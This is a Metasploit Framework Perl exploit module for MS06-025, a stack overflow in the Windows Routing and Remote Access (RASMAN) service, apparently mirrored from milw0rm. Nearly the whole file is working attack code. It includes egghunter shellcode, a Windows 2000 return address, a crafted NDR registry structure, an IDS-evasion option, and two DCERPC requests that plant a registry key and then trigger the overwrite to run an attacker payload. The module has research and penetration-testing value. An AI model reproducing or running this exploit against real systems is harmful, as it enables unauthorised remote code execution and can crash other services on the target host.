
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::rras_ms06_025_rasman;
use base "Msf::Exploit";
use strict;

use Pex::DCERPC;
use Pex::SMB;
use Pex::NDR;

my $advanced = {
	'FragSize'    => [ 256, 'The DCERPC fragment size' ],
	'BindEvasion' => [ 0,   'IDS Evasion of the Bind request' ],
	'DirectSMB'   => [ 0,   'Use direct SMB (445/tcp)' ],
  };

my $info = {
	'Name'    => 'Microsoft RRAS MSO6-025 RASMAN Registry Stack Overflow',
	'Version' => '$Revision: 1.1 $',
	'Authors' =>
	  [
		'Pusscat <pusscat [at] gmail.com>',
		'H D Moore <hdm [at] metasploit.com>'
	  ],

	'Arch' => ['x86'],
	'OS'   => [ 'win32', 'win2000', 'winxp' ],
	'Priv' => 1,

	'AutoOpts' => { 'EXITFUNC' => 'thread' },
	'UserOpts' =>
	  {
		'RHOST' => [ 1, 'ADDR', 'The target address' ],

		# SMB connection options
		'SMBUSER' => [ 0, 'DATA', 'The SMB username to connect with', '' ],
		'SMBPASS' => [ 0, 'DATA', 'The password for specified SMB username',''],
		'SMBDOM'  => [ 0, 'DATA', 'The domain for specified SMB username', '' ],
		'SMBPIPE' => [ 1, 'DATA', 'The pipe name to use (2000=ROUTER, XP=SRVSVC)', 'ROUTER' ],
	  },

	'Payload' =>
	  {
		'Space'    =>1024,
		'BadChars' => "\x00\x2c\x5c\x2e\x3a\x24",

		# sub esp, 4097 + inc esp makes stack happy
		'Prepend' => "\x81\xc4\xff\xef\xff\xff\x44",
	  },

	'Description' => Pex::Text::Freeform(
		qq{
    		This module exploits a registry-based stack overflow in the Windows Routing 
			and Remote Access Service. Since the service is hosted inside svchost.exe, 
			a failed exploit attempt can cause other system services to fail as well. 
			A valid username and password is required to exploit this flaw on Windows 2000. 
			When attacking XP SP1, the SMBPIPE option needs to be set to 'SRVSVC'.
			Exploiting this flaw involves two distinct steps - creating the registry key
			and then triggering an overwrite based on a read of this key. Once the key is
			created, it cannot be recreated. This means that for any given system, you
			only get one chance to exploit this flaw. Picking the wrong target will require
			a manual removal of the following registry key before you can try again:
			HKEY_USERS\\.DEFAULT\\Software\\Microsoft\\RAS Phonebook
}
	  ),

	'Refs' =>
	  [
		[ 'BID', '18325' ],
		[ 'CVE', '2006-2370' ],
		[ 'OSVDB', '26437' ],
		[ 'MSB', 'MS06-025' ]
	  ],

	'DefaultTarget' => 0,
	'Targets'       =>
	  [
		[ 'Automatic' ],
		[ 'Windows 2000',   0x750217ae ], # call esi
	  ],

	'Keys' => ['rras'],

	'DisclosureDate' => 'Jun 13 2006',
  };

sub new {
	my ($class) = @_;
	my $self    = $class->SUPER::new( { 'Info' => $info, 'Advanced' => $advanced }, @_ );
	return ($self);
}

sub Exploit {
	my ($self)      = @_;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target      = $self->Targets->[$target_idx];

	my $FragSize = $self->GetVar('FragSize') || 256;
	my $target   = $self->Targets->[$target_idx];

	my ( $res, $rpc );

	my $pipe    = "\\" . $self->GetVar("SMBPIPE");
	my $uuid    = '20610036-fa22-11cf-9823-00a0c911e5df';
	my $version = '1.0';

	my $handle =
	  Pex::DCERPC::build_handle( $uuid, $version, 'ncacn_np', $target_host,
		$pipe );

	my $dce = Pex::DCERPC->new(
		'handle'      => $handle,
		'username'    => $self->GetVar('SMBUSER'),
		'password'    => $self->GetVar('SMBPASS'),
		'domain'      => $self->GetVar('SMBDOM'),
		'fragsize'    => $self->GetVar('FragSize'),
		'bindevasion' => $self->GetVar('BindEvasion'),
		'directsmb'   => $self->GetVar('DirectSMB'),
	  );

	if ( !$dce ) {
		$self->PrintLine("[*] Could not bind to $handle");
		return;
	}

	my $smb = $dce->{'_handles'}{$handle}{'connection'};
	if ( $target->[0] =~ /Auto/ ) {
		if ( $smb->PeerNativeOS eq 'Windows 5.0' ) {
			$target = $self->Targets->[1];
			$self->PrintLine('[*] Detected a Windows 2000 target...');
		}
		#elsif ( $smb->PeerNativeOS eq 'Windows 5.1' ) {
		#	$target = $self->Targets->[2];
		#	$self->PrintLine('[*] Detected a Windows XP target...');
		#}
		else {
			$self->PrintLine( '[*] No target available : ' . $smb->PeerNativeOS() );
			return;
		}
	}

	# Shiny new egghunt from the 3.0 code :-)
	my $egghunt =
	  "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02" .
	  "\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8" .
	  "\x41\x41\x41\x41".
	  "\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7";

	# Pick a "filler" character that we know doesn't get mangled
	# by the wide string conversion routines
	my $fillset = "\xc1\xff\x67\x1b\xd3\xa3\xe7";
	my $filler  = substr($fillset, rand(length($fillset)), 1);
	my $eggtag  = '';
	my $pattern = '';

	while (length($eggtag) < 4) {
		$eggtag .= substr($fillset, rand(length($fillset)), 1);
	}

	# Configure the egg
	substr($egghunt, 0x12, 4, $eggtag);

	# We use an egghunter to give us nearly unlimited room for shellcode
	my $eggdata =
	  ($filler x 1024).
	  $eggtag.
	  $eggtag.
	  $shellcode.
	  ($filler x 1024);

	# Mini-payload that launches the egghunt
	my $bof = $filler x 178;
	substr($bof, 84, length($egghunt), $egghunt);

	# Base pointer override occurs with this string
	my $pat =
	  ($filler x 886).
	  pack('V', $target->[1]).
	  ($filler x 3). "\xc0".
	  $bof;

	# The vulnerability is triggered with the second field of this structure
	my $type2 =
	  Pex::NDR::UnicodeConformantVaryingStringPreBuilt( ($filler x 1024) . "\x00" ).
	  Pex::NDR::UnicodeConformantVaryingStringPreBuilt( $pat . "\x00" ).
	  Pex::NDR::UnicodeConformantVaryingStringPreBuilt( ($filler x 4096) . "\x00" ).
	  Pex::NDR::Long( int(rand(0xffffffff)) ).
	  Pex::NDR::Long( int(rand(0xffffffff)) );

	# Another gigantic structure, many of these fields up as registry values
	my $type1 =
	  Pex::NDR::Long(int(rand(0xffffffff))) . # OperatorDial
	  Pex::NDR::Long(int(rand(0xffffffff))) . # PreviewPhoneNumber
	  Pex::NDR::Long(int(rand(0xffffffff))) . # UseLocation
	  Pex::NDR::Long(int(rand(0xffffffff))) . # ShowLights
	  Pex::NDR::Long(int(rand(0xffffffff))) . # ShowConnectStatus
	  Pex::NDR::Long(int(rand(0xffffffff))) . # CloseOnDial
	  Pex::NDR::Long(int(rand(0xffffffff))) . # AllowLogonPhonebookEdits
	  Pex::NDR::Long(int(rand(0xffffffff))) . # AllowLogonLocationEdits
	  Pex::NDR::Long(int(rand(0xffffffff))) . # SkipConnectComplete
	  Pex::NDR::Long(int(rand(0xffffffff))) . # NewEntryWizard
	  Pex::NDR::Long(int(rand(0xffffffff))) . # RedialAttempts
	  Pex::NDR::Long(int(rand(0xffffffff))) . # RedialSeconds
	  Pex::NDR::Long(int(rand(0xffffffff))) . # IdleHangUpSeconds
	  Pex::NDR::Long(int(rand(0xffffffff))) . # RedialOnLinkFailure
	  Pex::NDR::Long(int(rand(0xffffffff))) . # PopupOnTopWhenRedialing
	  Pex::NDR::Long(int(rand(0xffffffff))) . # ExpandAutoDialQuery
	  Pex::NDR::Long(int(rand(0xffffffff))) . # CallbackMode
	  Pex::NDR::Long(0x45).
	  $type2.
	  Pex::NDR::UnicodeConformantVaryingString("\x00" x 129).
	  Pex::NDR::Long(int(rand(0xffffffff))).
	  Pex::NDR::UnicodeConformantVaryingString("\x00" x 520).
	  Pex::NDR::UnicodeConformantVaryingString("\x00" x 520).
	  Pex::NDR::Long(int(rand(0xffffffff))).
	  Pex::NDR::Long(int(rand(0xffffffff))).
	  Pex::NDR::Long(int(rand(0xffffffff))).
	  Pex::NDR::Long(int(rand(0xffffffff))).
	  Pex::NDR::Long(int(rand(0xffffffff))).
	  Pex::NDR::Long(int(rand(0xffffffff))).
	  Pex::NDR::Long(int(rand(0xffffffff))).
	  Pex::NDR::Long(int(rand(0xffffffff))).
	  Pex::NDR::UnicodeConformantVaryingString("\x00" x 514).
	  Pex::NDR::Long(int(rand(0xffffffff))).
	  Pex::NDR::Long(int(rand(0xffffffff)));

	# Create the actual RPC stub and tack our payload on the end
	my $stub =
	  $type1.
	  Pex::NDR::Long(int(rand(0xffffffff))).
	  $eggdata;

	$self->PrintLine("[*] Creating the malicious registry key...");
	my @response = $dce->request( $handle, 0x0A, $stub );

	$self->PrintLine("[*] Triggering the base pointer overwrite...");
	my @response = $dce->request( $handle, 0x0A, $stub );

	if (@response) {
		$self->PrintLine('[*] RPC server responded with:');
		foreach my $line (@response) {
			$self->PrintLine( '[*] ' . $line );
		}
		$self->PrintLine('[*] This probably means that the system is patched');
	}
	return;
}

1;

# milw0rm.com [2006-06-29]
